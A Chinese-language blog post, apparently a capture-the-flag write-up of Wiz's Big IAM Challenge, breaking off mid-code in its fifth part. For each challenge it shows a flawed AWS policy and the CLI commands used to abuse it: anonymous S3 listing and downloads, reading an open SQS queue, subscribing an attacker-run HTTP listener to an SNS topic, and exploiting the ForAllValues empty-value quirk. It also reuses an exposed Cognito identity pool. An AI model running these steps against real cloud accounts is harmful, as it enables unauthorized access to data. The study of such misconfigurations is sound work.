<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>从IAM-CTF看云身份安全 · Sally's Blog</title><meta name="description" content="Wiz-thebigiamchallenge1. 第一部分Buckets of Fun 存储桶的乐趣We all know that public buckets are risky. But can you find the flag?
1.1 我们查看拥有的权限12345678910111213"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>从IAM-CTF看云身份安全</a></h3></div><div class="post-content"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-thebigiamchallenge"><a href="#Wiz-thebigiamchallenge" class="headerlink" title="Wiz-thebigiamchallenge"></a>Wiz-thebigiamchallenge</h1><h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><h3 id="Buckets-of-Fun-存储桶的乐趣"><a href="#Buckets-of-Fun-存储桶的乐趣" class="headerlink" title="Buckets of Fun 存储桶的乐趣"></a>Buckets of Fun 存储桶的乐趣</h3><p>We all know that public buckets are risky. But can you find the flag?</p>
<h4 id="1-1-我们查看拥有的权限"><a href="#1-1-我们查看拥有的权限" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>允许所有用户对s3存储桶thebigiamchallenge-storage-9979f4b&#x2F;*下所有文件进行下载</li>
<li>允许所有用户对s3存储桶thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;目录下所有文件进行列举</li>
</ul>
<h4 id="1-2-根据这些权限我们先列举thebigiamchallenge-storage-9979f4b-files-下的文件"><a href="#1-2-根据这些权限我们先列举thebigiamchallenge-storage-9979f4b-files-下的文件" class="headerlink" title="1.2 根据这些权限我们先列举thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;下的文件"></a>1.2 根据这些权限我们先列举thebigiamchallenge-storage-9979f4b&#x2F;files&#x2F;下的文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span>  s3://thebigiamchallenge-storage-9979f4b/files/</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402110453022.png" alt="image-20240402110453022"></p>
<h4 id="1-3-查看到flag-txt，然后我们将该文件下载到本地可写目录并查看"><a href="#1-3-查看到flag-txt，然后我们将该文件下载到本地可写目录并查看" class="headerlink" title="1.3 查看到flag.txt，然后我们将该文件下载到本地可写目录并查看"></a>1.3 查看到flag.txt，然后我们将该文件下载到本地可写目录并查看</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag</span><br><span class="line"><span class="built_in">ls</span> /tmp</span><br><span class="line"><span class="built_in">cat</span> /tmp/flag</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402110616081.png" alt="image-20240402110616081"></p>
<h2 id="2-第二部分"><a href="#2-第二部分" class="headerlink" title="2. 第二部分"></a>2. 第二部分</h2><h3 id="Google-Analytics-谷歌分析"><a href="#Google-Analytics-谷歌分析" class="headerlink" title="Google Analytics 谷歌分析"></a>Google Analytics 谷歌分析</h3><p>We created our own analytics system specifically for this challenge. We think it’s so good that we even used it on this page. What could go wrong?</p>
<p>Join our queue and get the secret flag.</p>
<h4 id="1-1-我们查看拥有的权限-1"><a href="#1-1-我们查看拥有的权限-1" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;sqs:SendMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>允许所有用户向arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2发送消息和接收消息</li>
</ul>
<h4 id="1-2-尝试发送消息和接收消息"><a href="#1-2-尝试发送消息和接收消息" class="headerlink" title="1.2 尝试发送消息和接收消息"></a>1.2 尝试发送消息和接收消息</h4><p>发送一个hello消息到消息队列中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws sqs send-message --queue-url <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/0922978513</span></span><br><span class="line"><span class="string">74/wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span> --message-body <span class="string">&quot;Hello, this is a test mes</span></span><br><span class="line"><span class="string">sage!&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看到消息的md5和id</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112658824.png" alt="image-20240402112658824"></p>
<p>尝试接收sqs消息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws sqs receive-message --queue-url <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/0922978</span></span><br><span class="line"><span class="string">51374/wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看到消息完整结构，包括id、删除标识符、消息md5、请求体</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112853316.png" alt="image-20240402112853316"></p>
<p>根据请求体进入URL进行访问即获得flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402112951903.png" alt="image-20240402112951903"></p>
<h2 id="3-第三部分"><a href="#3-第三部分" class="headerlink" title="3. 第三部分"></a>3. 第三部分</h2><h3 id="Enable-Push-Notifications-能够推送通知"><a href="#Enable-Push-Notifications-能够推送通知" class="headerlink" title="Enable Push Notifications 能够推送通知"></a>Enable Push Notifications 能够推送通知</h3><p>We got a message for you. Can you get it?</p>
<h4 id="1-1-我们查看拥有的权限-2"><a href="#1-1-我们查看拥有的权限-2" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2008-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SNS:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;sns:Endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*@tbic.wiz.io&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>允许任何终端地址以 “@tbic.wiz.io” 结尾的AWS 用户订阅指定的 SNS 主题</li>
</ul>
<h4 id="1-2-尝试从终端地址订阅SNS主题"><a href="#1-2-尝试从终端地址订阅SNS主题" class="headerlink" title="1.2 尝试从终端地址订阅SNS主题"></a>1.2 尝试从终端地址订阅SNS主题</h4><p>但是我们如何绕过以 “@tbic.wiz.io” 结尾呢，事实上我们不一定从email的方式进行订阅，也可以通过http的方式进行订阅。</p>
<p>我们可以通过nc监听http端口从而获取订阅消息。</p>
<p>远程主机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>aws shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws sns subscribe --topic-arn <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNot</span></span><br><span class="line"><span class="string">ifications&quot;</span> --protocol http --notification-endpoint <span class="string">&quot;http://xx.xx.xx.xx:12345/@tb</span></span><br><span class="line"><span class="string">ic.wiz.io&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402114807053.png" alt="image-20240402114807053"></p>
<p>远程主机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f2557c40cfa9296426473bebf11d61a4631e90d1a8e8a0c89c77f5f7889b5f3806f62c6e59f2fcb23e4f0860516a0fd89471bb435f88d8f9110069d9efede2fa53927c743c18502aa112d4a58ca5bcdd29e5eb600a0c37ede1492b9b437936c3bdcce0d84b70d23fa68be2b19767aa745b</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402114937180.png" alt="image-20240402114937180"></p>
<p>再次监听最终收到订阅消息</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402115100724.png" alt="image-20240402115100724"></p>
<h2 id="4-第四部分"><a href="#4-第四部分" class="headerlink" title="4. 第四部分"></a>4. 第四部分</h2><h3 id="Admin-only-仅限管理员？"><a href="#Admin-only-仅限管理员？" class="headerlink" title="Admin only? 仅限管理员？"></a>Admin only? 仅限管理员？</h3><p>We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?</p>
<h4 id="1-1-我们查看拥有的权限-3"><a href="#1-1-我们查看拥有的权限-3" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ForAllValues:StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;aws:PrincipalArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>允许所有用户&#x2F;角色对指定 S3 存储桶中的所有对象执行获取操作（即下载文件）</li>
<li>允许所有用户&#x2F;角色列出指定 S3 存储桶中以 “files&#x2F;“ 开头的对象，但要求操作的主体必须是 IAM 用户 admin。</li>
</ul>
<h4 id="1-2-多值上下文运算符ForAllValues"><a href="#1-2-多值上下文运算符ForAllValues" class="headerlink" title="1.2 多值上下文运算符ForAllValues"></a>1.2 多值上下文运算符ForAllValues</h4><p>这个ForAllValues有个奇怪的地方，如果匹配到的是空值也会返回true，这就导致不带身份信息的用户访问s3存储桶越权的情况。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402120917492.png" alt="image-20240402120917492"></p>
<h4 id="1-3-尝试不带身份信息访问s3存储桶"><a href="#1-3-尝试不带身份信息访问s3存储桶" class="headerlink" title="1.3 尝试不带身份信息访问s3存储桶"></a>1.3 尝试不带身份信息访问s3存储桶</h4><p>使用–no-sign-request字段匿名访问s3存储桶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">ls</span> s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402121448278.png" alt="image-20240402121448278"></p>
<p>接着同第一部分一样将flag写入本地可写目录并查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag1</span><br><span class="line"><span class="built_in">cat</span> /tmp/flag1</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240402121629110.png" alt="image-20240402121629110"></p>
<h2 id="5-第五部分"><a href="#5-第五部分" class="headerlink" title="5. 第五部分"></a>5. 第五部分</h2><h3 id="Do-I-know-you-我知道你吗？"><a href="#Do-I-know-you-我知道你吗？" class="headerlink" title="Do I know you?  我知道你吗？"></a>Do I know you?  我知道你吗？</h3><p>We configured AWS Cognito as our main identity provider. Let’s hope we didn’t make any mistakes.</p>
<h4 id="1-1-我们查看拥有的权限-4"><a href="#1-1-我们查看拥有的权限-4" class="headerlink" title="1.1 我们查看拥有的权限"></a>1.1 我们查看拥有的权限</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;mobileanalytics:PutEvents&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;cognito-sync:*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VisualEditor1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>允许执行 <code>mobileanalytics:PutEvents</code> 和 <code>cognito-sync:*</code> 操作。</li>
<li>允许执行 <code>s3:GetObject</code> 和 <code>s3:ListBucket</code> 操作。</li>
</ul>
<h4 id="1-2-使用F12定位到cognito1-png附近发现敏感代码"><a href="#1-2-使用F12定位到cognito1-png附近发现敏感代码" class="headerlink" title="1.2 使用F12定位到cognito1.png附近发现敏感代码"></a>1.2 使用F12定位到cognito1.png附近发现敏感代码</h4><p>这段代码在前端使用了Cognito身份池凭据获取了s3存储桶中的cognito1.png并根据标签返回到前端，我们可以利用这个凭据获取其他对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span><br><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&quot;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&quot;</span>&#125;);</span><br><span class="line">  <span class="comment">// Set the region</span></span><br><span class="line">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">  